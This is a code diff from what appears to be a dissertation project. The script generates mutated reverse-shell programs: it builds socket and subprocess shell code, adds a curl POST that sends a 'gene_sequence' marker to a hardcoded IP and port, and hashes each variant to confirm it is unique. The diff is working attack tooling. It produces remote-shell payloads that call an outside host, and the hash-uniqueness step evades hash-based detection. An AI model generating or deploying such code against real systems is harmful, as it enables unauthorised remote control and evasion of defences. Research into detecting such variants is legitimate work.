@@ -208,7 +208,7 @@ def non_infinite_loops(passed, count = 1, upperlimit = 6) -> list:
 
 @unpacker(place, holders)
 def reverse_shell(ip, port) -> list:
-    required_imports = ['import socket\n', 'import subprocess\n']
+    required_imports = ['import socket\n', 'import subprocess\n', 'import os\n']
     required_components = [
         'def reverse_shell():\n',
         '\ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n',
@@ -234,7 +234,10 @@ def wrapper(ip, port):
     global gene_sequence
     x = reverse_shell(ip, port)
     x += f"x = \'gene_sequence: {gene_sequence}\'\n"
-    x += f"os.system(f'curl -d \"gene_sequence: {gene_sequence}\" -X POST {ip}' )\n"
+    x += f"os.system(f'curl -d \"gene_sequence: {gene_sequence}\" -X POST {ip} {port}' )\n"
+    y = hashlib.md5(x.encode("ascii")).hexdigest()
+    x += f"y = \'hash_check: {y}\'\n"
+    gene_sequence = [] #gene_sequence has been imbedded so zero out for multiple iterations
     return x
 
 
@@ -248,20 +251,21 @@ def gene_seed(choices, selection):
     gene_sequence.append(temp)
 
 
-def originality_check(hash_to_check: str) -> bool:
-    f = open("/home/buzzki11/Dissertation/brain/mount/filehashes2.txt", "w+") 
-    f1 = f.readlines()
-    if not f1:
-        f.write(y)
-    for i in f1:
-        print(f1)
-        print(f'{y}\n')
-        if f'{y}\n' in f1:
-            continue
-        else:
-            print(x)
-            f.write(f'{y}\n')
-    f.close()
+def originality_check(hash_to_check, counter=0) -> bool:
+    filename = "/home/buzzki11/Dissertation/brain/mount/filehashes2.txt"
+    # print(hash_to_check)
+    if counter == 0:
+        with open(filename, 'w+') as file:
+            file.write(f'{hash_to_check}\n')
+            return(True)
+    else: 
+        with open(filename, 'r+') as file:
+            for line in file:
+                if hash_to_check in line:
+                    return(False)
+                else:
+                    file.write(f'{hash_to_check}\n')
+                    return(True)
 
 
 if __name__ == "__main__":
@@ -281,14 +285,15 @@ if __name__ == "__main__":
     # y = '52eb5fa0c63355140232a2692bf06205'
     # print(y)
     from sys import argv
-    reseed(5)
     if len(argv) == 2:
             for i in range(0, int(argv[1])):
                 x = wrapper("175.20.0.200", "8080")
+                # print(x)
                 y = str(hashlib.md5(x.encode("ascii")).hexdigest())
-                originality_check(y)
+                originality_check(y, i)
     else:
         x = wrapper("175.20.0.200", "8080")
+        # print(x)
         y = str(hashlib.md5(x.encode("ascii")).hexdigest())
         originality_check(y)
 
